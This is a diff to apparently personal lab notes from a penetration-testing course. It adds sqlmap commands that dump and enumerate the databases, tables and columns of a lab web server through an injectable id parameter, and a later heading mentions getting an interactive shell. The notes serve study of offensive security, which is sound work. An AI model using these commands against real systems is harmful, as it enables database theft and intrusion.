@@ -178,6 +178,10 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 1.  Use sqlmap to obtain a full dump of the database.
 Using SQLMap is fairly straightforward. We first need to supply the tool with the URL and the parameter to test.
 `sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"`
-From here 
+From here we can quickly enumerate the databses:
+`--dbs --dump` to output a list of databases, "dump" can be applied to multiple other queries
+`-D Foo --tables` output a list of tables from the "Foo" database
+`-D Foo -T bar --columns` output a list of columns from the "bar" table in "Foo" database
+
 
 3.  Use sqlmap to obtain an interactive shell.
